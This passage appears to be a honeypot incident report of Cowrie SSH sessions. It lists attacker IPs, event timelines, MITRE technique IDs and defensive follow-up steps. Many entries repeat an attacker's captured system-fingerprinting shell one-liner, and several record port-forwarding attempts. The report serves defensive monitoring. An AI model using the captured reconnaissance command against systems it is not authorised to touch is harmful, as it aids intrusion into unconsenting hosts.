| `2026-08-01 13:06:35` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4cfcfe15a63

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:07 |
| **Last Seen** | 2026-08-01 13:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:07:16` | `cowrie.session.connect` |
| `2026-08-01 13:07:17` | `cowrie.client.version` |
| `2026-08-01 13:07:17` | `cowrie.client.kex` |
| `2026-08-01 13:07:18` | `cowrie.login.success` |
| `2026-08-01 13:07:19` | `cowrie.session.params` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.success` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.command.input` |
| `2026-08-01 13:07:19` | `cowrie.log.closed` |
| `2026-08-01 13:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e985c22a50

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:09 |
| **Last Seen** | 2026-08-01 13:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:09:04` | `cowrie.session.connect` |
| `2026-08-01 13:09:04` | `cowrie.client.version` |
| `2026-08-01 13:09:04` | `cowrie.client.kex` |
| `2026-08-01 13:09:05` | `cowrie.login.success` |
| `2026-08-01 13:09:07` | `cowrie.session.params` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.success` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.command.input` |
| `2026-08-01 13:09:07` | `cowrie.log.closed` |
| `2026-08-01 13:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c12cb39075

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-08-01 13:09 |
| **Last Seen** | 2026-08-01 13:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:09:31` | `cowrie.session.connect` |
| `2026-08-01 13:09:31` | `cowrie.client.version` |
| `2026-08-01 13:09:31` | `cowrie.client.kex` |
| `2026-08-01 13:09:33` | `cowrie.login.success` |
| `2026-08-01 13:09:33` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d29c6b1c372

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:10 |
| **Last Seen** | 2026-08-01 13:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:10:48` | `cowrie.session.connect` |
| `2026-08-01 13:10:48` | `cowrie.client.version` |
| `2026-08-01 13:10:48` | `cowrie.client.kex` |
| `2026-08-01 13:10:49` | `cowrie.login.success` |
| `2026-08-01 13:10:50` | `cowrie.session.params` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.success` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.command.input` |
| `2026-08-01 13:10:50` | `cowrie.log.closed` |
| `2026-08-01 13:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-240c5a75fed5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:12 |
| **Last Seen** | 2026-08-01 13:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:12:30` | `cowrie.session.connect` |
| `2026-08-01 13:12:30` | `cowrie.client.version` |
| `2026-08-01 13:12:30` | `cowrie.client.kex` |
| `2026-08-01 13:12:31` | `cowrie.login.success` |
| `2026-08-01 13:12:32` | `cowrie.session.params` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.success` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.command.input` |
| `2026-08-01 13:12:32` | `cowrie.log.closed` |
| `2026-08-01 13:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f2af5477394

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:14 |
| **Last Seen** | 2026-08-01 13:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:14:15` | `cowrie.session.connect` |
| `2026-08-01 13:14:15` | `cowrie.client.version` |
| `2026-08-01 13:14:15` | `cowrie.client.kex` |
| `2026-08-01 13:14:16` | `cowrie.login.success` |
| `2026-08-01 13:14:17` | `cowrie.session.params` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.success` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.command.input` |
| `2026-08-01 13:14:17` | `cowrie.log.closed` |
| `2026-08-01 13:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b1a733120ca

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:16 |
| **Last Seen** | 2026-08-01 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:16:04` | `cowrie.session.connect` |
| `2026-08-01 13:16:04` | `cowrie.client.version` |
| `2026-08-01 13:16:04` | `cowrie.client.kex` |
| `2026-08-01 13:16:05` | `cowrie.login.success` |
| `2026-08-01 13:16:06` | `cowrie.session.params` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.success` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.command.input` |
| `2026-08-01 13:16:06` | `cowrie.log.closed` |
| `2026-08-01 13:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a293a54e1b92

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:17 |
| **Last Seen** | 2026-08-01 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:17:51` | `cowrie.session.connect` |
| `2026-08-01 13:17:51` | `cowrie.client.version` |
| `2026-08-01 13:17:51` | `cowrie.client.kex` |
| `2026-08-01 13:17:52` | `cowrie.login.success` |
| `2026-08-01 13:17:53` | `cowrie.session.params` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.success` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.command.input` |
| `2026-08-01 13:17:53` | `cowrie.log.closed` |
| `2026-08-01 13:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-799370807017

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:19 |
| **Last Seen** | 2026-08-01 13:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:19:43` | `cowrie.session.connect` |
| `2026-08-01 13:19:43` | `cowrie.client.version` |
| `2026-08-01 13:19:43` | `cowrie.client.kex` |
| `2026-08-01 13:19:44` | `cowrie.login.success` |
| `2026-08-01 13:19:45` | `cowrie.session.params` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.success` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.command.input` |
| `2026-08-01 13:19:45` | `cowrie.log.closed` |
| `2026-08-01 13:19:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0173e20ea37c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:21 |
| **Last Seen** | 2026-08-01 13:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:21:25` | `cowrie.session.connect` |
| `2026-08-01 13:21:25` | `cowrie.client.version` |
| `2026-08-01 13:21:25` | `cowrie.client.kex` |
| `2026-08-01 13:21:26` | `cowrie.login.success` |
| `2026-08-01 13:21:27` | `cowrie.session.params` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.success` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:27` | `cowrie.command.input` |
| `2026-08-01 13:21:28` | `cowrie.log.closed` |
| `2026-08-01 13:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc283a2ae5b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:23 |
| **Last Seen** | 2026-08-01 13:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:23:11` | `cowrie.session.connect` |
| `2026-08-01 13:23:11` | `cowrie.client.version` |
| `2026-08-01 13:23:11` | `cowrie.client.kex` |
| `2026-08-01 13:23:12` | `cowrie.login.success` |
| `2026-08-01 13:23:13` | `cowrie.session.params` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.success` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.command.input` |
| `2026-08-01 13:23:14` | `cowrie.log.closed` |
| `2026-08-01 13:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ff18128c59

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 13:24 |
| **Last Seen** | 2026-08-01 13:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:24:56` | `cowrie.session.connect` |
| `2026-08-01 13:24:56` | `cowrie.client.version` |
| `2026-08-01 13:24:56` | `cowrie.client.kex` |
| `2026-08-01 13:24:56` | `cowrie.login.success` |
| `2026-08-01 13:24:56` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:24:56` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37e85be54f21

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:24 |
| **Last Seen** | 2026-08-01 13:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:24:57` | `cowrie.session.connect` |
| `2026-08-01 13:24:57` | `cowrie.client.version` |
| `2026-08-01 13:24:57` | `cowrie.client.kex` |
| `2026-08-01 13:24:59` | `cowrie.login.success` |
| `2026-08-01 13:25:00` | `cowrie.session.params` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.success` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.command.input` |
| `2026-08-01 13:25:00` | `cowrie.log.closed` |
| `2026-08-01 13:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
